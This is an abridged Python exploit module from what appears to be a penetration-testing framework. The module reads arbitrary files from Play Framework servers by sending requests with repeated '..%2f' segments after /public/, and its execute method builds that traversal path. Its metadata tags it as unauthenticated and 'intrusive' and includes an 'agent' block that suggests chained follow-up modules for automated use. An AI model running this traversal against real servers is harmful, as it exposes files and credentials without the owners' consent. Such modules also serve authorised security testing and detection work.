#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reads arbitrary files via Play Framework /public/."""
...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Play Framework - public Path Traversal File Read',
        'description': (
            'Reads arbitrary files via Play Framework /public/..%2f traversal.'
        ),
        ...
        'tags': ['play', 'lfi', 'file-read', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/play_framework_lfi_detect'],
            },
        },
    }
    ...
    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/').replace('/', '%2f')
        path = '/public/' + ('..%2f' * 8) + remote
